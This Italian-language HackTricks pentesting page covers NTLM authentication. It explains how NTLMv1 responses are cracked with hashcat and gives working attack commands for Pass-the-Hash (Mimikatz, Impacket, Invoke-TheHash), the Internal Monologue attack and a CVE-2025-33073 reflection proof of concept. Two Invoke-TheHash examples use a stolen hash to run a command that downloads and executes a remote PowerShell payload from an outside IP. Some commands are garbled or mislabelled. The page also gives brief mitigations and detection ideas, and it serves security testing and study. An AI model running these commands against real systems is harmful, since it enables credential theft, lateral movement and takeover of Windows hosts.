# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Informazioni di base

In ambienti in cui sono in uso **Windows XP e Server 2003**, vengono utilizzati hash LM (Lan Manager), anche se è ampiamente noto che questi possono essere compromessi facilmente. Un particolare hash LM, `AAD3B435B51404EEAAD3B435B51404EE`, indica uno scenario in cui LM non è impiegato, rappresentando l'hash di una stringa vuota.

Per impostazione predefinita, il protocollo di autenticazione **Kerberos** è il metodo principale utilizzato. NTLM (NT LAN Manager) interviene in circostanze specifiche: assenza di Active Directory, inesistenza del dominio, malfunzionamento di Kerberos dovuto a una configurazione errata, o quando le connessioni vengono tentate usando un indirizzo IP invece di un hostname valido.

La presenza dell'header **"NTLMSSP"** nei pacchetti di rete segnala un processo di autenticazione NTLM.

Il supporto per i protocolli di autenticazione - LM, NTLMv1 e NTLMv2 - è fornito da una DLL specifica situata in `%windir%\Windows\System32\msv1\_0.dll`.

**Punti chiave**:

- Gli hash LM sono vulnerabili e un LM hash vuoto (`AAD3B435B51404EEAAD3B435B51404EE`) indica che non viene usato.
- Kerberos è il metodo di autenticazione predefinito, con NTLM usato solo in determinate circostanze.
- I pacchetti di autenticazione NTLM sono identificabili dall'header "NTLMSSP".
- I protocolli LM, NTLMv1 e NTLMv2 sono supportati dal file di sistema `msv1\_0.dll`.

## LM, NTLMv1 e NTLMv2

Puoi controllare e configurare quale protocollo verrà usato:

### GUI

Esegui _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. Ci sono 6 livelli (da 0 a 5).

![](<../../images/image (919).png>)

### Registry

Questo imposterà il livello 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Possibili valori:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Basic NTLM Domain authentication Scheme

1. L'**user** introduce le sue **credentials**
2. La macchina client **invia una richiesta di autenticazione** inviando il **domain name** e lo **username**
3. Il **server** invia il **challenge**
4. Il **client cifra** il **challenge** usando l'hash della password come key e lo invia come response
5. Il **server invia** al **Domain controller** il **domain name**, lo **username**, il **challenge** e la **response**. Se **non** c'è un Active Directory configurato o il domain name è il nome del server, le credentials vengono **controllate localmente**.
6. Il **domain controller controlla se tutto è corretto** e invia le informazioni al server

Il **server** e il **Domain Controller** sono in grado di creare un **Secure Channel** tramite il server **Netlogon** poiché il Domain Controller conosce la password del server (è dentro il db **NTDS.DIT**).

### Local NTLM authentication Scheme

L'autenticazione è quella menzionata **prima ma** il **server** conosce l'**hash dell'user** che cerca di autenticarsi all'interno del file **SAM**. Quindi, invece di chiedere al Domain Controller, il **server controllerà da solo** se l'user può autenticarsi.

### NTLMv1 Challenge

La **lunghezza del challenge è di 8 byte** e la **response è lunga 24 byte**.

L'**hash NT (16bytes)** è diviso in **3 parti da 7bytes ciascuna** (7B + 7B + (2B+0x00\*5)): la **ultima parte viene riempita con zeri**. Poi, il **challenge** viene **cifrato separatamente** con ciascuna parte e i byte **cifrati risultanti** vengono **uniti**. Totale: 8B + 8B + 8B = 24Bytes.

**Problemi**:

- Mancanza di **randomness**
- Le 3 parti possono essere **attaccate separatamente** per trovare l'NT hash
- **DES is crackable**
- La 3º key è composta sempre da **5 zeri**.
- Dato lo **stesso challenge** la **response** sarà **uguale**. Quindi, puoi dare come **challenge** alla vittima la stringa "**1122334455667788**" e attaccare la response usando **precomputed rainbow tables**.

### NTLMv1 attack

Oggi è sempre meno comune trovare ambienti con Unconstrained Delegation configurato, ma questo non significa che non puoi **abuse a Print Spooler service** configurato.

Potresti abusare di alcune credentials/sessions che hai già su AD per **chiedere alla printer di autenticarsi** verso qualche **host sotto il tuo controllo**. Poi, usando `metasploit auxiliary/server/capture/smb` o `responder` puoi **impostare il authentication challenge a 1122334455667788**, catturare il tentativo di autenticazione e, se è stato fatto usando **NTLMv1**, sarai in grado di **craccarlo**.\
Se stai usando `responder` potresti provare a **usare il flag `--lm`** per provare a **downgrade** l'**authentication**.\
_Note that for this technique the authentication must be performed using NTLMv1 (NTLMv2 is not valid)._

Ricorda che la printer userà l'computer account durante l'autenticazione, e gli computer accounts usano **password lunghe e casuali** che **probabilmente non riuscirai a craccare** usando dizionari comuni. Però l'autenticazione **NTLMv1** **usa DES** ([more info here](#ntlmv1-challenge)), quindi usando alcuni servizi dedicati in modo specifico al cracking di DES riuscirai a craccarlo (ad esempio potresti usare [https://crack.sh/](https://crack.sh) o [https://ntlmv1.com/](https://ntlmv1.com)).

### NTLMv1 attack with hashcat

NTLMv1 può anche essere rotto con il NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) che formatta i messaggi NTLMv1 in un metodo che può essere rotto con hashcat.

The command
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
dovrebbe produrre quanto segue:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Esegui hashcat (il distributed è meglio tramite uno strumento come hashtopolis) poiché altrimenti ci vorranno diversi giorni.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
In questo caso sappiamo che la password è password, quindi faremo cheating a scopo dimostrativo:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Ora dobbiamo usare le hashcat-utilities per convertire le chiavi des crackate in parti dell'hash NTLM:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Finalmente l'ultima parte:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Combine them together:
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

La **lunghezza del challenge è di 8 bytes** e vengono inviate **2 responses**: una è lunga **24 bytes** e la lunghezza dell’**altra** è **variabile**.

**La prima response** viene creata cifrando con **HMAC_MD5** la **stringa** composta dal **client e dal domain** e usando come **key** l’**hash MD4** dell’**NT hash**. Poi, il **risultato** verrà usato come **key** per cifrare con **HMAC_MD5** il **challenge**. A questo si aggiunge **un client challenge di 8 bytes**. Totale: 24 B.

**La seconda response** viene creata usando **diversi valori** (un nuovo client challenge, un **timestamp** per evitare **replay attacks**...)

Se hai un **pcap che ha catturato un processo di autenticazione riuscito**, puoi seguire questa guida per ottenere domain, username, challenge e response e provare a crakeare la password: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Una volta ottenuto l'hash della vittima**, puoi usarlo per **impersonarla**.\
Hai bisogno di usare un **tool** che esegua l'**autenticazione NTLM usando** quell'hash, **oppure** puoi creare un nuovo **sessionlogon** e **iniettare** quell'hash dentro **LSASS**, così quando viene eseguita qualsiasi **autenticazione NTLM**, verrà usato **quell'hash**. L'ultima opzione è quella che fa mimikatz.

**Ricorda che puoi eseguire attacchi Pass-the-Hash anche usando account Computer.**

### **Mimikatz**

**Deve essere eseguito come administrator**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Questo avvierà un processo che apparterrà agli utenti che hanno avviato mimikatz ma internamente in LSASS le credenziali salvate sono quelle presenti nei parametri di mimikatz. Poi, puoi accedere alle risorse di rete come se fossi quell'utente (simile al trucco `runas /netonly` ma non devi conoscere la password in chiaro).

### Pass-the-Hash from linux

Puoi ottenere code execution su macchine Windows usando Pass-the-Hash da Linux.\
[**Access here to learn how to do it.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows compiled tools

Puoi scaricare[ i binari di impacket per Windows qui](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (In questo caso devi specificare un comando, cmd.exe e powershell.exe non sono validi per ottenere una shell interattiva)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Ci sono diversi altri binari Impacket...

### Invoke-TheHash

Puoi ottenere gli script powershell da qui: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Questa funzione è una **miscela di tutte le altre**. Puoi passare **diversi host**, **escluderne** alcuni e **selezionare** l'**opzione** che vuoi usare (_SMBExec, WMIExec, SMBClient, SMBEnum_). Se selezioni **uno qualsiasi** tra **SMBExec** e **WMIExec** ma **non** fornisci alcun parametro _**Command**_, si limiterà a **verificare** se hai **permessi** sufficienti.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Deve essere eseguito come amministratore**

Questo strumento farà la stessa cosa di mimikatz (modificare la memoria di LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Esecuzione remota manuale di Windows con username e password


{{#ref}}
../lateral-movement/
{{#endref}}

## Estrazione delle credenziali da un Windows Host

**Per maggiori informazioni su** [**come ottenere credenziali da un Windows host dovresti leggere questa pagina**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Internal Monologue attack

L'Internal Monologue Attack è una tecnica stealth di estrazione di credenziali che consente a un attacker di recuperare hash NTLM dalla macchina di una vittima **senza interagire direttamente con il processo LSASS**. A differenza di Mimikatz, che legge gli hash direttamente dalla memoria e viene spesso bloccato dalle soluzioni di endpoint security o da Credential Guard, questo attack sfrutta **chiamate locali al pacchetto di autenticazione NTLM (MSV1_0) tramite la Security Support Provider Interface (SSPI)**. L'attacker prima **degrada le impostazioni NTLM** (ad esempio LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) per নিশ্চিতire che NetNTLMv1 sia consentito. Poi impersona token utente esistenti ottenuti da processi in esecuzione e attiva localmente l'autenticazione NTLM per generare risposte NetNTLMv1 usando una challenge nota.

Dopo aver catturato queste risposte NetNTLMv1, l'attacker può recuperare rapidamente gli hash NTLM originali usando **rainbow table precompilate**, abilitando ulteriori Pass-the-Hash attack per lateral movement. Crucialmente, l'Internal Monologue Attack rimane stealthy perché non genera traffico di rete, non inietta codice e non attiva dump diretti di memoria, rendendo più difficile per i defender rilevarlo rispetto a metodi tradizionali come Mimikatz.

Se NetNTLMv1 non viene accettato — a causa di policy di sicurezza applicate, allora l'attacker potrebbe non riuscire a recuperare una risposta NetNTLMv1.

Per gestire questo caso, lo strumento Internal Monologue è stato aggiornato: acquisisce dinamicamente un server token usando `AcceptSecurityContext()` per **catturare ancora risposte NetNTLMv2** se NetNTLMv1 fallisce. Sebbene NetNTLMv2 sia molto più difficile da crackare, apre comunque una via per relay attack o brute-force offline in casi limitati.

Il PoC si trova in **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.

## NTLM Relay and Responder

**Leggi qui una guida più dettagliata su come eseguire questi attack:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Parse NTLM challenges from a network capture

**Puoi usare** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM & Kerberos *Reflection* via Serialized SPNs (CVE-2025-33073)

Windows contiene diverse mitigazioni che cercano di prevenire attack di *reflection* in cui un'autenticazione NTLM (o Kerberos) che origina da un host viene rilanciata verso lo **stesso** host per ottenere privilegi SYSTEM.

Microsoft ha rotto la maggior parte delle catene pubbliche con MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) e patch successive; tuttavia **CVE-2025-33073** mostra che le protezioni possono ancora essere bypassate abusando del modo in cui il **client SMB tronca i Service Principal Names (SPNs)** che contengono target-info *marshalled* (serialized).

### TL;DR of the bug
1. Un attacker registra un **DNS A-record** il cui label codifica uno SPN marshalled – ad esempio
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. La vittima viene costretta ad autenticarsi a quell'hostname (PetitPotam, DFSCoerce, ecc.).
3. Quando il client SMB passa la stringa target `cifs/srv11UWhRCAAAAA…` a `lsasrv!LsapCheckMarshalledTargetInfo`, la chiamata a `CredUnmarshalTargetInfo` **rimuove** il blob serialized, lasciando **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (o l'equivalente Kerberos) ora considera il target come *localhost* perché la parte breve dell'host corrisponde al nome del computer (`SRV1`).
5. Di conseguenza, il server imposta `NTLMSSP_NEGOTIATE_LOCAL_CALL` e inserisce il **SYSTEM access-token di LSASS** nel contesto (per Kerberos viene creato un subsession key marcato SYSTEM).
6. Il relay di quell'autenticazione con `ntlmrelayx.py` **o** `krbrelayx.py` fornisce pieni diritti SYSTEM sullo stesso host.

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch & Mitigations
* La patch KB per **CVE-2025-33073** aggiunge un controllo in `mrxsmb.sys::SmbCeCreateSrvCall` che blocca qualsiasi connessione SMB il cui target contenga info marshalled (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).
* Imporre **SMB signing** per prevenire la reflection anche su host non patchati.
* Monitorare record DNS simili a `*<base64>...*` e bloccare i vettori di coercion (PetitPotam, DFSCoerce, AuthIP...).

### Detection ideas
* Capture di rete con `NTLMSSP_NEGOTIATE_LOCAL_CALL` dove l'IP del client ≠ IP del server.
* Kerberos AP-REQ contenente una subsession key e un client principal uguale al hostname.
* Windows Event 4624/4648 SYSTEM logon immediatamente seguiti da remote SMB writes dallo stesso host.

Per la variante di local reflection di **March 2026** che sfrutta **SMB arbitrary ports** e **TCP connection reuse** per arrivare a `NT AUTHORITY\SYSTEM`, vedi:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
* [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
* [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
